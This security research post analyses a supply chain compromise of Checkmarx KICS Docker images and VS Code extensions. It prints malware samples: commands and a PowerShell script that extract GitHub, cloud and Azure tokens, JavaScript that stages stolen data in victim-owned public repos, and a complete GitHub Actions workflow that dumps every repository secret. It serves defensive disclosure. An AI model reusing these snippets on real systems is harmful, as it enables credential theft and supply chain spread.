---
title: "Malicious Checkmarx Artifacts Found in Official KICS Docker Repository and Code Extensions"
short_title: "Malicious Checkmarx Artifacts in KICS Docker Repo & Extensions"
date: 2026-04-22 12:00:00 +0000
categories: [Supply Chain, Threat Intelligence]
tags: [Docker, VS Code, Open VSX, Extensions, TeamPCP, Infostealer, npm, JavaScript, Obfuscation, Developer Compromise]
author: socket_research_team
canonical_url: https://socket.dev/blog/checkmarx-supply-chain-compromise
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/b26ca7fb74dd477037706d53ace64b2860e8273a-1254x1254.png?w=1000&q=95&fit=max&auto=format
  alt: "Malicious Checkmarx Artifacts Found in Official KICS Docker Repository and Code Extensions"
description: "Docker and Socket have uncovered malicious Checkmarx KICS images and suspicious code extension releases in a broader supply chain compromise."
---

Docker alerted Socket to malicious images pushed to the official `checkmarx/kics` Docker Hub repository after internal monitoring flagged suspicious new activity around KICS image tags. Our investigation found that attackers appear to have overwritten existing tags, including `v2.1.20` and alpine, while also introducing a new `v2.1.21` tag that does not correspond to a legitimate upstream release.

Analysis of the poisoned image indicates that the bundled KICS binary was modified to include data collection and exfiltration capabilities not present in the legitimate version. Our investigation found evidence that the malware could generate an uncensored scan report, encrypt it, and send it to an external endpoint, creating a serious risk for teams using KICS to scan infrastructure-as-code files that may contain credentials or other sensitive configuration data.

As Socket researchers dug deeper, the incident quickly expanded beyond poisoned container images. In addition to the trojanized KICS image, we found signs that related Checkmarx developer tooling may also have been affected, including recent VS Code extension releases that introduced code capable of downloading and executing a remote addon through the Bun runtime. Analysis of those releases found that the behavior appeared in versions `1.17.0` and `1.19.0`, was removed in `1.18.0`, and relied on a hardcoded GitHub URL to fetch and run additional JavaScript without user confirmation or integrity verification.

Early analysis of the poisoned KICS image found that the bundled binary had been modified to include unauthorized telemetry and exfiltration functionality not present in the legitimate version. Based on current evidence, organizations that used the affected image to scan Terraform, CloudFormation, or Kubernetes configurations should consider any secrets or credentials exposed to those scans potentially at risk. The evidence suggests this is not an isolated Docker Hub incident, but part of a broader supply chain compromise affecting multiple Checkmarx distribution channels.

We are crediting Docker for catching the suspicious image push and notifying us. Their alert enabled rapid investigation into what appears to be another serious supply chain compromise affecting Checkmarx's KICS distribution. Their analysis is published here: [Catching the KICS push: what happened, and the case for open, fast collaboration](https://www.docker.com/blog/trivy-kics-and-the-shape-of-supply-chain-attacks-so-far-in-2026/)

*This is a developing story. We have disclosed our findings to the Checkmarx team and will publish full technical analysis as our investigation continues.*

**UPDATE**: Several `checkmarx/kics` tags were updated to point to the malicious digest and have since been restored to the prior legitimate release. The affected tags included `v2.1.20-debian`, `v2.1.20`, `debian`, `alpine`, and `latest`. The `v2.1.21` tag has since been deleted.

## Investigation Update

Our follow-on analysis shows that the Checkmarx compromise includes a multi-stage credential theft and propagation component downloaded as [`mcpAddon.js`](https://raw.githubusercontent.com/Checkmarx/ast-vscode-extension/68ed490b575a57ef51a419f43b2b087e8ce16a46/modules/mcpAddon.js). The initial infection vector is embedded directly in the compromised VS Code / Open VSX extensions, which introduced a hidden "MCP addon" feature. On extension activation, this feature silently downloads `mcpAddon.js` from a hardcoded GitHub URL pointing to a specific commit inside Checkmarx's own repository (`raw.githubusercontent.com/.../68ed490b/...`). The file is written to disk (`~/.checkmarx/mcp/mcpAddon.js`) and immediately executed using the Bun runtime.

The malware harvests developer and cloud credentials, compresses and encrypts the results, and exfiltrates them both to an external endpoint and to threat actor-created public GitHub repositories under victim accounts. It also abuses stolen GitHub tokens to inject a new GitHub Actions workflow that captures secrets available to the workflow run as an artifact, and uses stolen npm credentials to identify writable packages for downstream republishing. In effect, the operation was designed not just to steal data from infected environments, but to turn compromised developer and CI/CD access into new exfiltration and supply chain propagation paths.

### Attribution Signal: TeamPCP Appears to be Taking Credit

TeamPCP appears to be [taking credit for the Checkmarx compromise](https://x.com/pcpcats/status/2047018766689599974). On April 22, the `@pcpcats` account reposted coverage of the incident and published taunting messages after the story broke, including: "Thank you OSS distribution for another very successful day at PCP inc." These posts do not by themselves prove attribution, but they add to the evidence linking the campaign to TeamPCP.

![](https://cdn.sanity.io/images/cgdhsj6q/production/eb4ffbc6d3a0a1af87022b7f3d13ed7dcbafe24c-600x497.png?w=1600&q=95&fit=max&auto=format)

![](https://cdn.sanity.io/images/cgdhsj6q/production/915bbf7f3872118d94659fe06c6e3a9b63a35820-642x575.png?w=1600&q=95&fit=max&auto=format)

In March 2026, the group compromised Checkmarx GitHub Actions and OpenVSX plugins in a broader supply chain attack that also hit Trivy and LiteLLM, using malicious code to steal CI/CD secrets and environment variables.

### From Git History Tampering to Runtime Payload Delivery

A central element of this attack was the use of Git history manipulation to quietly stage a malicious payload and later retrieve it at runtime from a trusted source. The attacker began by injecting a backdated commit (`68ed490b`) into the `Checkmarx/ast-vscode-extension` repository. This commit was deliberately crafted to appear legitimate: it was spoofed to look like it was authored in 2022, attached to a real commit as its parent, and given a benign-looking change. However, it introduced a large (~10MB) file, `modules/mcpAddon.js`. This allowed the threat actor to embed a full second-stage payload while also making manual and automated analysis more difficult. This way, the attacker was attempting to evade both human review and automated scanning, as loading a remote file from the official GitHub repository at runtime would not raise immediate red flags.

![](https://cdn.sanity.io/images/cgdhsj6q/production/63ba29fa1bf91111fe414dc2184b9b57f084f029-2048x920.png?w=1600&q=95&fit=max&auto=format)
_GitHub file view showing the oversized **`mcpAddon.js`** payload tied to an orphaned commit outside the repository's active branch history. The missing branch association, innocuous commit message, and ~10MB single-file JavaScript blob all point to a suspicious, nonstandard insertion._

## Technical Analysis

The Checkmarx VSCode extension `ast-vscode-extension` embeds a JavaScript module from an orphaned [GitHub commit](https://github.com/Checkmarx/ast-vscode-extension/commit/68ed490b575a57ef51a419f43b2b087e8ce16a46). This JavaScript file `mcpAddon.js` is executed using the Bun interpreter; supporting execution on Windows and Unix-based systems.

`mcpAddon.js` functions as a stand-alone token stealer which uses the victim's shell (PowerShell or Bash) to enumerate and exfiltrate the following:

- Github Auth tokens
- AWS credentials
- Microsoft Azure authentication tokens
- Google Cloud credential databases
- NPM configuration files
- SSH keys and configuration files
- Environment variables
- Claude and other MCP configuration files

Upon execution of `mcpAddon.js`, Bun launches the following commands on Windows systems:

1. `C:\\WINDOWS\\system32\\cmd.exe /d /s /c "gh auth token"`
1. `C:\\WINDOWS\\system32\\cmd.exe /d /s /c "gcloud config config-helper --format json"`
1. `C:\\WINDOWS\\system32\\cmd.exe /d /s /c "az account get-access-token --output json --resource <https://management.azure.com>"`
1. `C:\\WINDOWS\\system32\\cmd.exe /d /s /c "azd auth token --output json --no-prompt --scope <https://management.azure.com/.default>"`

It also launches a PowerShell command to enumerate Azure tokens of attached tenants:

```sh
powershell.exe -NoProfile -NonInteractive -Command "
          $tenantId = \"\"
          $m = Import-Module Az.Accounts -MinimumVersion 2.2.0 -PassThru
          $useSecureString = $m.Version -ge [version]'2.17.0' -and $m.Version -lt [version]'5.0.0'

          $params = @{
            ResourceUrl = \"https://management.azure.com\"
          }

          if ($tenantId.Length -gt 0) {
            $params[\"TenantId\"] = $tenantId
          }

          if ($useSecureString) {
            $params[\"AsSecureString\"] = $true
          }

          $token = Get-AzAccessToken @params

          $result = New-Object -TypeName PSObject
          $result | Add-Member -MemberType NoteProperty -Name ExpiresOn -Value $token.ExpiresOn

          if ($token.Token -is [System.Security.SecureString]) {
            if ($PSVersionTable.PSVersion.Major -lt 7) {
              $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($token.Token)
              try {
                $result | Add-Member -MemberType NoteProperty -Name Token -Value ([System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr))
              }
              finally {
                [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
              }
            }
            else {
              $result | Add-Member -MemberType NoteProperty -Name Token -Value ($token.Token | ConvertFrom-SecureString -AsPlainText)
            }
          }
          else {
            $result | Add-Member -MemberType NoteProperty -Name Token -Value $token.Token
          }

          Write-Output (ConvertTo-Json $result)
          ",
```

Tokens and secrets are then compressed and exfiltrated over HTTPS to `https://audit.checkmarx[.]cx/v1/telemetry`

In addition to the `mcpAddon.js` file downloaded by the VSCode extension, the compromised Docker images bundle an ELF binary written in Golang named `kics`. Although it mimics the functionality of KICS scanner, it contains the same unique Command and Control server address as `mcpAddon.js`, and may contain additional malicious code.

### Obfuscation Techniques (`mcpAddon.js`)

- A giant one-line bundle with mangled identifiers such as `_0x3865d8`, `_0x5747`, and `_0x488b`.
- A string-table decoder (`_0x5747`) backed by a massive encoded array (`_0x488b`), plus an initial array-rotation loop to break simple static inspection.
- Additional scrambled string decoding via a second custom decoder (`Ul0` / `__decodeScrambled`) for file paths, domains, and commands.
- Multiple gzip+base64 embedded payloads, including:
  - an embedded Python memory-scraping script,
  - an embedded `setup.mjs` loader for republished npm packages,
  - an embedded GitHub Actions workflow YAML,
  - a hardcoded RSA public key,
  - an ideological manifesto string.
- Misleading naming such as `v1/telemetry`, even though the actual content being collected is secrets and credentials.

## Public GitHub Repositories Used for Exfiltration Staging

Analysis of the malware's GitHub abuse logic and live public repository artifacts shows that the threat actor abuses GitHub credentials to create public repositories used for exfiltration staging. Depending on which token is active, those repositories may be created inside a victim-owned namespace or inside a central staging namespace controlled or reused by the threat actor. 

The repositories follow a consistent auto-generated naming scheme, reuse the deceptive description "Checkmarx Configuration Storage", and store result files containing an encrypted payload, a wrapped encryption key, and a token field. In at least some cases, the malware also embeds token-like data in commit messages, indicating that the operator used both repository contents and repository metadata as covert staging channels.

The following deobfuscated code from [`mcpAddon.js`](https://raw.githubusercontent.com/Checkmarx/ast-vscode-extension/68ed490b575a57ef51a419f43b2b087e8ce16a46/modules/mcpAddon.js) shows how the malware creates public repositories under victim accounts and uses them to store staged exfiltration results.

```javascript
async function Pl0(client) {
  let repoName = aDO();

  let { data } = await client.request("POST /user/repos", {
    name: repoName,
    private: false, // Creates a public repo in the victim account.
    auto_init: true,
    description: "Checkmarx Configuration Storage",
    has_discussions: false,
    has_issues: false,
    has_wiki: false
  });

  return {
    owner: data.full_name.split('/')[0],
    name: data.name,
    fullName: data.full_name,
    url: data.html_url,
    private: data.private
  };
}

class Cy extends MH {
  async commitBatch(batch) {
    let content = Buffer
      .from(JSON.stringify(batch, null, 2))
      .toString("base64");

    let fileName =
      "results-" + Date.now() + "-" + this.commitCounter++ + ".json";

    await this.client.rest.repos.createOrUpdateFileContents({
      owner: this.createdRepo.owner,
      repo: this.createdRepo.name,
      path: "results/" + fileName,
      message: !batch.token
        ? "Add files."
        : "LongLiveTheResistanceAgainstMachines:" + batch.token,
      // Appends the token to the commit message.
      content
    });

    return true;
  }
}
```

![](https://cdn.sanity.io/images/cgdhsj6q/production/3d7401ccdf5493506f122fa76d53d8c9400e49ae-1449x920.png?w=1600&q=95&fit=max&auto=format)
_GitHub repository search showing a cluster of threat actor-created public staging repositories tied to the Checkmarx incident._

What stands out from the live GitHub search is that the repo names are not random gibberish. They follow a very consistent pattern:

`<word>-<word>-<3 digits>`

Examples visible right now include:

- `gesserit-melange-813`
- `prescient-sandworm-556`
- `prana-melange-944`
- `powindah-cogitor-798`
- `fedaykin-phibian-527`
- `gesserit-ornithopter-627`
- `ghola-ornithopter-550`
- `atreides-thumper-424`
- `sayyadina-slig-539`

That is a strong pattern, and the vocabulary is highly suggestive. A large portion of those words are **Dune / Frank Herbert universe terms** or at least strongly Dune-adjacent:

- `gesserit` → Bene Gesserit
- `melange`
- `prescient`
- `sandworm`
- `fedaykin`
- `ornithopter`
- `ghola`
- `atreides`
- `sayyadina`

![](https://cdn.sanity.io/images/cgdhsj6q/production/f9f72895fdb5ed92e99b4b810ff3f430833e4d5b-1901x518.png?w=1600&q=95&fit=max&auto=format)
_GitHub file view of a threat actor-created exfiltration repository. The **`results`** JSON stores an encrypted payload plus a wrapped key and token field. The commit message also carries an encoded token-like value, indicating the operator reused repository metadata as an additional covert data channel._

These are not normal "configuration storage" files. This is a tiny public repository with the description and README both set to "Checkmarx Configuration Storage", a results/ folder, and only 3 commits total. Two of those commits on April 22, 2026 use the message pattern `LongLiveTheResistanceAgainstMachines:<encoded string>`.

It contains exactly three fields: `envelope`, `key`, and `token`.

- `envelope` is the encrypted payload blob,
- `key` is the encrypted key used to unlock that payload,
- `token` is an encoded GitHub token value.

These are threat actor-deposited result files, most likely containing encrypted exfiltrated data, with the token field serving as an identifier and/or the stolen GitHub credential used to create or maintain the repo.

## GitHub Actions Workflow Injection for Secret Exfiltration

The worm propagates using stolen GitHub credentials, automatically identifying repositories it can modify and injecting a malicious GitHub Actions workflow (`.github/workflows/format-check.yml`). Its behavior unfolds in three stages:

- **Repository discovery:** It enumerates repositories the victim can push to, prioritizing recently active ones. This includes personal, organizational, and collaborator repos.
- **Secret-aware targeting:** Before taking action, it checks whether a repository (or its parent organization) has configured GitHub Actions secrets. Repositories without secrets are ignored, focusing efforts only where sensitive data is at risk.
- **Workflow injection and exfiltration:** For each qualifying repository, the worm creates a new branch, commits the malicious workflow, and waits for it to execute. The workflow extracts secrets and packages them as artifacts, which the worm then downloads. Afterward, it cleans up traces by deleting the branch and workflow run.

To scale efficiently, the worm processes multiple repositories in parallel and caps the total number of targets per victim. This is done programmatically using an authenticated token (already compromised), with a sequence like:

1. Create a new branch from the repo's default branch HEAD (`POST /repos/{owner}/{repo}/git/refs`)
1. Commit a new workflow file onto that branch (`PUT /repos/{owner}/{repo}/contents/.github/workflows/format-check.yml`)
  - `content` = base64(gzip(payload YAML))
  - `branch` = newly created branch (e.g. `gE`)

GitHub Actions automatically discovers and executes any workflow file placed under `.github/workflows/` when a triggering event occurs. Since the injected workflow is triggered on the push events, committing the file itself is enough to trigger execution. There is no need to open a PR or merge the changes into default branch.

## Payload: The Injected Workflow

Here's the full YAML the worm injects (gzipped + base64-encoded in the bundle, decompressed at runtime with `Bun.gunzipSync`):

{% raw %}
```yaml
name: Formatter
run-name: Formatter
on:
  push:
jobs:
  format:
    runs-on: ubuntu-latest
    env:
      VARIABLE_STORE: ${{ toJSON(secrets) }}  # ← the heist
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
      - name: Run Formatter
        run: echo "$VARIABLE_STORE" > format-results.txt
      - uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f
        with:
          name: format-results
          path: format-results.txt
```
{% endraw %}

{% raw %}`${{ toJSON(secrets) }}`{% endraw %} serializes the entire secrets context of the repository (and any inherited org-level secrets) into a JSON blob in one shot. GitHub normally prevents iterating over secret names from workflow expressions, but {% raw %}`toJSON(secrets)`{% endraw %} collapses them all into a single string without needing to know the names up front. The workflow then writes that JSON to `format-results.txt` and uploads it as a workflow artifact, which is retrievable via `GET /repos/{owner}/{repo}/actions/artifacts/{id}/zip` by the attacker for up to 90 days using any token with `actions:read` .

### npm Propagation

After exfiltrating GitHub secrets, the worm pivots to **npm ecosystem propagation** by abusing the victim's npm credentials. Specifically, the worm reads the victim's `.npmrc` file, which might give an **auth token** with publish permissions to the attacker.

Using the stolen token, it builds a list of packages the victim can modify:

1. **Primary path (authenticated):**
  - Calls the npm API:`/-/org/<user>/package`
  - Returns all packages the user has access to, including org packages.
  - Filters for `"write"` permissions → only packages the attacker can publish to.
1. **Fallback path (unauthenticated):**
  - Queries npm search:`https://registry.npmjs.org/-/v1/search?text=maintainer:<user>&size=250`
  - Collects publicly listed packages where the user is a maintainer.
1. **Edge case:**
  - If the identity is already a package name, it is added directly.

The result is a full list of **publishable targets** tied to the stolen token. The assembled list of packages is then used by the caller to **loop over each package and republish it with the malicious payload**, enabling rapid lateral spread across the npm ecosystem.

## Recommendations

Organizations that pulled the affected Checkmarx artifacts should treat this incident as a credential exposure and CI/CD compromise event. Immediately remove the affected extensions, actions, and container images from developer systems and build environments. Rotate any credentials that may have been exposed to those environments, including GitHub tokens, npm tokens, cloud credentials, SSH keys, and CI/CD secrets. Review GitHub for unauthorized repository creation, unexpected workflow files under `.github/workflows/`, suspicious workflow runs, artifact downloads, and public repositories matching the observed staging pattern. Audit npm for unauthorized publishes, version changes, or newly added install hooks. In cloud environments, review access logs for unusual secret access, token use, and newly issued credentials.

On endpoints and runners, hunt for outbound connections to the observed exfiltration infrastructure, execution of Bun where it is not normally used, access to files such as `.npmrc`, `.git-credentials`, `.env`, cloud credential stores, and unexpected use of `gh auth token`, `gcloud`, `az`, or `azd`. For GitHub Actions, review whether any unapproved workflows were created on transient branches and whether artifacts such as `format-results.txt` were generated or downloaded.

As a longer-term control, reduce the blast radius of future supply chain incidents by locking down token scopes, requiring short-lived credentials where possible, restricting who can create or publish packages, hardening GitHub Actions permissions, disabling unnecessary artifact access, and monitoring for new public repositories or workflow changes created outside normal release processes.

## Indicators of Compromise

### Open VSX / VS Code Extensions

1. [`checkmarx/cx-dev-assist@1.19.0`](https://www.notion.so/2504cb3adfeb803d94aadc247d090207?pvs=21)
1. [`checkmarx/cx-dev-assist@1.17.0`](https://www.notion.so/2504cb3adfeb803d94aadc247d090207?pvs=21)
1. [`checkmarx/ast-results@2.66.0`](https://www.notion.so/2504cb3adfeb803d94aadc247d090207?pvs=21)
1. [`checkmarx/ast-results@2.63.0`](https://www.notion.so/2504cb3adfeb803d94aadc247d090207?pvs=21)

### Network Indicators

- `94[.]154[.]172[.]43`
- `https://audit.checkmarx[.]cx/v1/telemetry`

### File Hashes

### Docker Images

The following compromised KICS tags shared the same multi-arch **index manifest digest**:

**alpine, v2.1.20, v2.1.21**

- Index manifest digest: `sha256:2588a44890263a8185bd5d9fadb6bc9220b60245dbcbc4da35e1b62a6f8c230d`
- Image digest (linux/amd64): `sha256:d186161ae8e33cd7702dd2a6c0337deb14e2b178542d232129c0da64b1af06e4`
- Image digest (linux/arm64): `sha256:415610a42c5b51347709e315f5efb6fffa588b6ebc1b95b24abf28088347791b`

Affected package URLs:

- `pkg:docker/checkmarx/kics@alpine?platform=linux%2Famd64`
- `pkg:docker/checkmarx/kics@v2.1.20?platform=linux%2Famd64`
- `pkg:docker/checkmarx/kics@v2.1.21?platform=linux%2Famd64`
- `pkg:docker/checkmarx/kics@alpine?platform=linux%2Farm64`
- `pkg:docker/checkmarx/kics@v2.1.20?platform=linux%2Farm64`
- `pkg:docker/checkmarx/kics@v2.1.21?platform=linux%2Farm64`

**debian, v2.1.20-debian, v2.1.21-debian**

- Index manifest digest: `sha256:222e6bfed0f3bb1937bf5e719a2342871ccd683ff1c0cb967c8e31ea58beaf7b`
- Image digest (linux/amd64): `sha256:a6871deb0480e1205c1daff10cedf4e60ad951605fd1a4efaca0a9c54d56d1cb`
- Image digest (linux/arm64): `sha256:ff7b0f114f87c67402dfc2459bb3d8954dd88e537b0e459482c04cffa26c1f07`

Affected package URLs:

- `pkg:docker/checkmarx/kics@debian?platform=linux%2Famd64`
- `pkg:docker/checkmarx/kics@v2.1.20-debian?platform=linux%2Famd64`
- `pkg:docker/checkmarx/kics@v2.1.21-debian?platform=linux%2Famd64`
- `pkg:docker/checkmarx/kics@debian?platform=linux%2Farm64`
- `pkg:docker/checkmarx/kics@v2.1.20-debian?platform=linux%2Farm64`
- `pkg:docker/checkmarx/kics@v2.1.21-debian?platform=linux%2Farm64`

**latest**

- Index manifest digest: `sha256:a0d9366f6f0166dcbf92fcdc98e1a03d2e6210e8d7e8573f74d50849130651a0`
- Image digest (linux/amd64): `sha256:26e8e9c5e53c972997a278ca6e12708b8788b70575ca013fd30bfda34ab5f48f`
- Image digest (linux/arm64): `sha256:7391b531a07fccbbeaf59a488e1376cfe5b27aef757430a36d6d3a087c610322`

Affected package URLs:

- `pkg:docker/checkmarx/kics@latest?platform=linux%2Famd64`
- `pkg:docker/checkmarx/kics@latest?platform=linux%2Farm64`

Note that tags associated with these image versions may be updated or restored after publication.

### `mcpAddon.js`

- MD5 - `d47de3772f2d61a043e7047431ef4cf4`
- SHA1 - `2b12cc5cc91ec483048abcbd6d523cdc9ebae3f3`
- SHA256 - `24680027afadea90c7c713821e214b15cb6c922e67ac01109fb1edb3ee4741d9`

### kics (ELF executable)

- MD5 - `e1023db24a29ab0229d99764e2c8deba`
- SHA1 - `250f3633529457477a9f8fd3db3472e94383606a`
- SHA256 - `2a6a35f06118ff7d61bfd36a5788557b695095e7c9a609b4a01956883f146f50`
